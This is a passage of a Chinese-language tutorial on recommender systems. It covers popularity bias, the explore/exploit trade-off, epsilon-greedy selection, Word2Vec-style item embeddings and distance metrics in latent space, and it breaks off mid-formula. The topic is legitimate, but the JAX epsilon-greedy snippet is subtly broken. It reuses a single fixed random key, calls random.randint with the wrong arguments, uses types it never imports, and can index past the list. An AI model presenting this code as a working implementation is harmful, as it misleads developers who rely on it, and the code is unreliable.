<h3 data-id="heading-9">推荐系统中的探索与利用</h3>
<p>在构建推荐系统时，开发者往往面临着<strong>维持当前最优性能与探索未知潜力的平衡问题</strong>。单纯依赖历史数据最大化短期收益（如 MPIR 算法），往往会导致系统陷入局部最优，并引发长期的负面效应。</p>
<p><strong>最热门商品推荐器 (MPIR)</strong>：虽然易于实现且逻辑清晰，但其本质是放大马太效应。<strong>随着时间，循环反馈会失效</strong>。MPIR 会持续向用户展示已知的热门物品，这导致这些物品的流行度进一步上升。在极限情况下，推荐系统将退化为<strong>平凡推荐器</strong>，即失去个性化能力，仅能反馈大盘趋势。</p>
<h4 data-id="heading-10">模态状态风险</h4>
<p>在缺乏随机化机制的情况下，单纯最大化损失函数（或奖励函数）会导致算法迅速陷入<strong>模态状态 (Modal State) <strong>。这意味着算法无法再学习到关于</strong>长尾物品</strong>或潜在兴趣的任何新信息，从而使系统的整体探索能力陷入停滞。</p>
<h4 data-id="heading-11">探索与利用框架</h4>
<p>为了克服上述故障模式，推荐系统引入了源自<strong>多臂老虎机 (Multi-armed Bandits, MAB)</strong> 的策略。</p>
<p><strong>利用 (Exploit)</strong>：基于当前已知的最优先验估计，选择预期奖励最高的推荐方案（“臂”），以最大化即时收益。</p>
<p><strong>探索 (Explore)</strong>：以一定的概率尝试非最优或未知的替代方案，目的是收集更多数据，更新对物品分布的估计。</p>
<p>给定一组候选推荐方案（臂） <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span>，智能体（Agent）的目标是最大化奖励函数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>t</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R(y_t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>。由于智能体初始并不知道结果 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>a</mi><mo>∈</mo><mi>A</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{a \in A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8607em;vertical-align:-0.1774em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span/></span></span></span></span></span></span></span></span></span> 的真实分布，其执行逻辑如下：</p>
<ol>
<li><strong>假设先验分布</strong>：假设 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>a</mi><mo>∈</mo><mi>A</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{a \in A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8607em;vertical-align:-0.1774em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span/></span></span></span></span></span></span></span></span></span> 遵循某种分布。</li>
<li><strong>数据更新</strong>：通过观察推荐结果 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">y_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，更新分布参数。</li>
<li><strong>期望估计</strong>：在足够观察后，估计各方案的期望奖励 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>μ</mi><mrow><mi>a</mi><mo>∈</mo><mi>A</mi></mrow></msub><mo>=</mo><mi mathvariant="double-struck">E</mi><mo stretchy="false">[</mo><mi mathvariant="script">R</mi><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>a</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\mu_{a \in A} = \mathbb{E}[\mathcal{R}(Y_a)]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathbb">E</span><span class="mopen">[</span><span class="mord mathcal">R</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)]</span></span></span></span></span>。</li>
</ol>
<h4 data-id="heading-12"><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span>-贪婪算法</h4>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span>-贪婪(<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span>-greedy)是处理探索-利用权衡最直观且高效的算法。</p>
<p>对于参数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\epsilon \in [0, 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>：</p>
<ul>
<li><strong>以概率 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">1 - \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span> 执行“利用”</strong>：选择当前估计奖励最高的物品。</li>
<li><strong>以概率 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span> 执行“探索”</strong>：从候选池中随机选择一个物品。</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> jax <span class="hljs-keyword">import</span> random
key = random.PRNGKey(<span class="hljs-number">0</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_most_popular_recs_ep_greedy</span>(<span class="hljs-params">
    max_num_recs: <span class="hljs-built_in">int</span>,
    epsilon: <span class="hljs-built_in">float</span>
</span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]]:
    <span class="hljs-comment"># 验证超参数范围</span>
    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> &lt; epsilon &lt; <span class="hljs-number">1.0</span>
    
    items_popularity_dict = get_item_popularities()
    
    <span class="hljs-keyword">if</span> items_popularity_dict:
        <span class="hljs-comment"># 1. 排序器逻辑：按流行度降序排列</span>
        sorted_items = <span class="hljs-built_in">sorted</span>(
            items_popularity_dict.items(),
            key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-number">1</span>],
            reverse=<span class="hljs-literal">True</span>,
        )
        top_items = [i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sorted_items]
        recommendations = []
        
        <span class="hljs-comment"># 2. 填充推荐列表</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(max_num_recs):
            <span class="hljs-comment"># 确定当前步骤是利用还是探索</span>
            <span class="hljs-keyword">if</span> random.uniform(key) &gt; epsilon: 
                <span class="hljs-comment"># 利用：弹出当前最热门的物品</span>
                recommendations.append(top_items.pop(<span class="hljs-number">0</span>))
            <span class="hljs-keyword">else</span>: 
                <span class="hljs-comment"># 探索：从剩余物品池中随机抽取</span>
                explore_choice = random.randint(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(top_items))
                recommendations.append(top_items.pop(explore_choice))
                
        <span class="hljs-keyword">return</span> recommendations
    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<p>引入 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span>-贪婪策略后，推荐系统的三层架构需进行相应的职责调整：</p>

























<table><thead><tr><th><strong>组件</strong></th><th><strong>状态</strong></th><th><strong>变更说明</strong></th></tr></thead><tbody><tr><td><strong>收集器 (Collector)</strong></td><td>无需变更</td><td>依然负责获取物品的原始流行度计数。</td></tr><tr><td><strong>排序器 (Ranker)</strong></td><td>无需变更</td><td>依然按流行度对候选物品进行全序排列。</td></tr><tr><td><strong>服务端 (Server)</strong></td><td><strong>核心变更</strong></td><td>不再直接截取 Top-K，而是集成 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span> 逻辑，逐个确定推荐位是填充排名靠前的物品还是随机物品。</td></tr></tbody></table>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span> 的取值直接决定了系统的“好奇心”程度。</p>
<p><strong>动态衰减策略</strong>：通用的最佳实践是在系统运行初期设置较大的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span>（高强度探索），随着收集的数据增多，逐步减小 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">ϵ</span></span></span></span></span> 的值，直至收敛到一个较小的稳定值。</p>
<h3 data-id="heading-13">自然语言处理与推荐系统的几何关联</h3>
<p>在工业级推荐系统的演进过程中，借用自然语言处理（NLP）领域的序列建模直觉已成为一种标准范式。<strong>Word2Vec</strong> 模型通过<strong>词语在句子中的共现关系</strong>来学习词的语义表示。将其逻辑迁移至推荐系统，便催生了<strong>将用户行为序列视作句子，将交互物品视作单词的建模策略</strong>。</p>
<p>Skip-gram 结构的 Word2Vec 通过预测上下文单词来学习目标单词的隐含意义。其核心逻辑如下：</p>
<ul>
<li><strong>输入与输出</strong>：输入为经过独热编码（One-hot Encoding）的单词，输出层维度等于词汇表大小，用于预测共现概率。</li>
<li><strong>瓶颈层（Bottleneck Layer）</strong>：网络中间存在一个维度远小于词汇表大小的隐藏层。</li>
<li><strong>表征压缩</strong>：通过训练，高维稀疏的独热向量被映射到低维稠密的潜在空间（Latent Space）。在这个空间中，向量间的几何相似性直接对应了语义的相似性。</li>
</ul>
<p>推荐系统利用上述思想实现从协同过滤（CF）向序列化建模的跨越：</p>
<ul>
<li><strong>句子与序列</strong>：将用户在特定时间内的有序互动记录（如电影评分序列、商品点击序列）视为 NLP 中的句子。</li>
<li><strong>单词与物品</strong>：序列中的每一个互动项被视为单词。</li>
<li><strong>相似性假设</strong>：模型通过物品在大量用户历史中的共现关系学习其向量表示。基于此，推荐系统可以从“寻找相似用户”转向“寻找相似物品”，即假设用户未来会喜欢与其历史行为空间距离接近的物品。</li>
</ul>
<h4 data-id="heading-14">潜在空间与向量搜索</h4>
<p>通过模型学习，物品被嵌入到一个高维的<strong>潜在空间（或称表示空间、环境空间）</strong>。推荐系统的本质任务转变为在该空间内进行高效的几何搜索。</p>
<p>在高维潜在空间中，距离度量面临维度诅咒：</p>
<ul>
<li><strong>欧几里得距离失效</strong>：随着维度增加，空间趋于稀疏，欧几里得距离的性能显著下降。局部距离虽有参考价值，但全局距离的可靠性较低。</li>
<li><strong>余弦相似度（Cosine Similarity）</strong>：在实践中，余弦距离通常比欧几里得距离表现更好，因为它关注的是向量的方向而非绝对长度。</li>
<li><strong>相似度最大化</strong>：工程实现上，最大化向量点积或余弦相似度通常比最小化距离函数更具鲁棒性。</li>
</ul>
<blockquote>
<p>[!NOTE]</p>
<p>在数学中，欧几里得距离被定义为连接两点之间的<strong>线段长度</strong>。</p>
<p>二维空间 (2D)</p>
<p>对于平面上的两个点 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(x_1, y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q(x_2, y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>，距离 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span> 为：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>Q</mi><mo stretchy="false">)</mo><mo>=</mo><msqrt><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mn>2</mn></msub><mo>−</mo><msub><mi>y</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">d(P, Q) = \sqrt{(x_2 - x_1)^2 + (y_2 - y_1)^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">Q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.2561em;"/><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9839em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"/><span class="mord" style="padding-left:1em;"><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.9439em;"><span class="pstrut" style="height:3.2em;"/><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119&#10;c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120&#10;c340,-704.7,510.7,-1060.3,512,-1067&#10;l0 -0&#10;c4.7,-7.3,11,-11,19,-11&#10;H40000v40H1012.3&#10;s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232&#10;c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1&#10;s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26&#10;c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z&#10;M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2561em;"><span/></span></span></span></span></span></span></span></span></div>
<p>三维空间 (3D)</p>
<p>对于空间中的点 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>z</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(x_1, y_1, z_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.044em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span 